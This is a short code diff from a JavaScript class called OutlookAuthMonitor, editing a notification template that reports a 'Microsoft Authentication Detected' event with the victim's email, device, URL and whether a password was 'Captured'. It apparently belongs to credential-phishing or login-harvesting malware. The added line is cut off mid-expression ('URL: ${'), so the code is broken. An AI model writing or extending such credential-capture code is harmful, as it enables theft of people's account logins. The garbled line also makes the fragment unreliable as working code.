@@ -515,7 +515,7 @@ class OutlookAuthMonitor {
 🔐 *Microsoft Authentication Detected* 🔐
 
 🕒 Time: ${this.sessionData.timestamp}
-🌐 URL: ${this.sessionData.location}
+🌐 URL: ${
 📱 Device: ${this.truncateText(this.sessionData.userAgent, 100)}
 👤 Email: ${email}
 🔑 Password: ${this.sessionData.microsoftAuth.formInputs.password ? 'Captured' : 'N/A'}
